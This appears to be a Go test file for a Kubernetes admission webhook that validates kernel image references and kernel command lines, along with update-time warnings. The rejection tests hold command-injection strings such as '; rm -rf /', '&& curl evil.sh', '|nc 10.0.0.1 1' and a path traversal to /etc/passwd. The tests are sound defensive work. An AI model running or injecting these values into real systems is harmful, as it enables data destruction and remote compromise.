package swiftkernel

import (
	"context"
	"strings"
	"testing"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	kernelv1alpha1 "github.com/kubeswift-io/kubeswift/api/kernel/v1alpha1"
)

func sk(image, cmdline string) *kernelv1alpha1.SwiftKernel {
	return &kernelv1alpha1.SwiftKernel{
		ObjectMeta: metav1.ObjectMeta{Namespace: "kubeswift-system", Name: "faas"},
		Spec: kernelv1alpha1.SwiftKernelSpec{
			OCIRef:        kernelv1alpha1.OCIRef{Image: image},
			KernelCmdline: cmdline,
		},
	}
}

func TestValidateCreate_AcceptsARealKernelRef(t *testing.T) {
	v := &Validator{}
	for _, img := range []string{
		"ghcr.io/kubeswift-io/kubeswift/kernels/sandbox:6.6.13",
		"ghcr.io/kubeswift-io/kubeswift/kernels/faas:6.6.1",
		"registry.example.com:5000/team/kernel@sha256:" + strings.Repeat("a", 64),
	} {
		if _, err := v.ValidateCreate(context.Background(), sk(img, "console=ttyS0 root=/dev/vda")); err != nil {
			t.Errorf("rejected a legitimate reference %q: %v", img, err)
		}
	}
}

func TestValidateCreate_RequiresAnImage(t *testing.T) {
	v := &Validator{}
	for _, img := range []string{"", "   "} {
		if _, err := v.ValidateCreate(context.Background(), sk(img, "")); err == nil {
			t.Errorf("accepted an empty image %q", img)
		}
	}
}

func TestValidateCreate_RejectsShellMetacharacters(t *testing.T) {
	// The kernel-pull Job runs as root with a hostPath mount on
	// /var/lib/kubeswift/kernels. The image reaches it via an env var now
	// (#435), so this is defence in depth — it keeps that fix from silently
	// regressing if the Job is ever rewritten with interpolation.
	v := &Validator{}
	for _, img := range []string{
		"ghcr.io/x/y:$(id)",
		"ghcr.io/x/y:`id`",
		"ghcr.io/x/y:v1; rm -rf /",
		"ghcr.io/x/y:v1 && curl evil.sh",
		"ghcr.io/x/y:v1|nc 10.0.0.1 1",
		"ghcr.io/x/y:v1\nFROM scratch",
	} {
		if _, err := v.ValidateCreate(context.Background(), sk(img, "")); err == nil {
			t.Errorf("accepted an image with shell metacharacters: %q", img)
		}
	}
}

func TestValidateCreate_RejectsTraversalAndStrayWhitespace(t *testing.T) {
	v := &Validator{}
	if _, err := v.ValidateCreate(context.Background(), sk("ghcr.io/../../etc/passwd:v1", "")); err == nil {
		t.Error("accepted '..' in the image reference")
	}
	if _, err := v.ValidateCreate(context.Background(), sk("  ghcr.io/x/y:v1  ", "")); err == nil {
		t.Error("accepted leading/trailing whitespace")
	}
}

func TestValidateCreate_RejectsNewlineInCmdline(t *testing.T) {
	// kernelCmdline is not shell-interpolated, but it IS written to files and
	// passed as one argument — an embedded newline splits it.
	v := &Validator{}
	if _, err := v.ValidateCreate(context.Background(),
		sk("ghcr.io/x/y:v1", "console=ttyS0\ninit=/bin/sh")); err == nil {
		t.Error("accepted a newline in kernelCmdline")
	}
	if _, err := v.ValidateCreate(context.Background(),
		sk("ghcr.io/x/y:v1", "console=ttyS0\x00")); err == nil {
		t.Error("accepted a NUL in kernelCmdline")
	}
}

func TestValidateUpdate_WarnsThatAnImageChangeDoesNothing(t *testing.T) {
	// The real trap this webhook exists to surface: the per-node pull Job is
	// named pullJobName(name, node) with no image in the key, and Create
	// swallows AlreadyExists — so re-pointing a SwiftKernel at a new tag is a
	// silent no-op and nodes keep serving the old artifact.
	v := &Validator{}
	old := sk("ghcr.io/kubeswift-io/kubeswift/kernels/sandbox:6.6.12", "")
	new := sk("ghcr.io/kubeswift-io/kubeswift/kernels/sandbox:6.6.13", "")

	warnings, err := v.ValidateUpdate(context.Background(), old, new)
	if err != nil {
		t.Fatalf("a legitimate re-point must not be rejected: %v", err)
	}
	if len(warnings) == 0 {
		t.Fatal("no warning on an image change — the silent no-op stays silent")
	}
	w := strings.Join(warnings, " ")
	for _, want := range []string{"6.6.12", "6.6.13", "delete job"} {
		if !strings.Contains(strings.ToLower(w), strings.ToLower(want)) {
			t.Errorf("warning does not mention %q; an operator cannot act on it:\n%s", want, w)
		}
	}
}

func TestValidateUpdate_NoWarningWhenTheImageIsUnchanged(t *testing.T) {
	v := &Validator{}
	k := sk("ghcr.io/x/y:v1", "console=ttyS0")
	warnings, err := v.ValidateUpdate(context.Background(), k, sk("ghcr.io/x/y:v1", "console=ttyS0 quiet"))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(warnings) != 0 {
		t.Errorf("warned on an unrelated edit: %v", warnings)
	}
}

func TestValidateUpdate_StillValidatesTheNewObject(t *testing.T) {
	v := &Validator{}
	if _, err := v.ValidateUpdate(context.Background(),
		sk("ghcr.io/x/y:v1", ""), sk("ghcr.io/x/y:$(id)", "")); err == nil {
		t.Error("update path skipped validation of the new image")
	}
}
